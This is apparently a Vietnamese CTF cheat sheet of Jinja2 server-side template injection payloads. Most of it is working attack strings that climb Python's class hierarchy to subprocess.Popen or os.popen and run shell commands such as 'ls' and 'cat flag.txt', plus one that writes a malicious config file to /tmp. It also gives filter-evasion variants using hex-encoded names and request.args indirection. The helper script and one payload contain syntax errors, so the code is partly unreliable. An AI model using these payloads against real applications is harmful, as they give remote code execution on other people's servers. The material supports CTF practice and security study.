# Jinja2 (python)


## 1. Chạy payload tìm <class ‘subprocess.Popen’> in subclasses 

`__subclasses__` là một thuộc tính nhằm liệt kê tất cả các weak references trong các lớp con của nó 

```py
{{''.__class__.mro()[1].__subclasses__()}}
```

### filter
```py
{{()|attr(‘\x5f\x5fclass\x5f\x5f’)|attr(‘\x5f\x5fbase\x5f\x5f’)|attr(‘\x5f\x5fsubclasses\x5f\x5f’)()}}
```

## 2. Tìm vị trí subprocess.Popen thủ công
```py
{{''.__class__.__mro__[1].__subclasses__()[200:]}}
```
## 3. Chạy code tìm "subprocess.Popen" xuất hiện ở index coppy paste kq in ra vào file lol.txt
```py
with open('lol.txt') as p:
    check = p.read()
for (index,value in enumerate(check.split(','))):
    if ("<class 'subprocess.Popen'>" in value):
        print(index)
```

## 4. Thay số index hiện ra vào [] //vd 258 nếu [] bị filter =>__getitem__ 
```py
{{ ''.__class__.__mro__[1].__subclasses__()[408]('ls -la',shell=True,stdout=-1).communicate()[0].strip() }}
```

### filter
```py
{{()|attr(request.args.c)|attr(request.args.b)|attr(request.args.s)()|attr(request.args.g)(258)('ls',shell=True,stdout=-1)|attr('communicate')()|attr(request.args.g)(0)|attr('decode')('utf-8')}}&c=__class__&b=__base__&s=__subclasses__&g=__getitem__

{{''[request.args.a][request.args.b][2][request.args.c]()[408]('cat+flag.txt',shell=dTrue,stdout=-1).communicate()[0].strip()}}&a=__class__&b=__mro__&c=__subclasses__
```

## 1 Số payload khác
```py
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

{{self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read()}}

{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}

{{request.application.__globals__.__builtins__.__import__('os')['popen']('ls')['read']()}}

{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

{{(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()}}


```

## FILTER GLOBALS
```py
// lọc từ .__globals__ => hexa_encode thành ['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f'] 

["__globa""ls__"]

|attr('\x5f\x5fg\x6co\x62a\x6cs\x5f\x5f')

|attr('popen')('cat flag.txt')|attr('read')()}}

{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}  

{{self._TemplateReference__context.cycler.__init__['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f'].os.popen('ls').read() }} 
```

## FILTER _
```py
//lọc _ ở trc class 
{{()|attr(request.args.c)}}&c=__class__
{{request.application.__globals__.__builtins__.__import__('os')['popen']('ls')['read']()}}

{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}

{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']('ls')['read']()}}

```

## FILTER [ ]

![filter](https://github.com/tinasahara1/Vulnerable-CTF-/blob/cf0bd6546f72ef8b4e95df70e96dd684f4c8bbad/SQL/MySQL/image/filter.png)

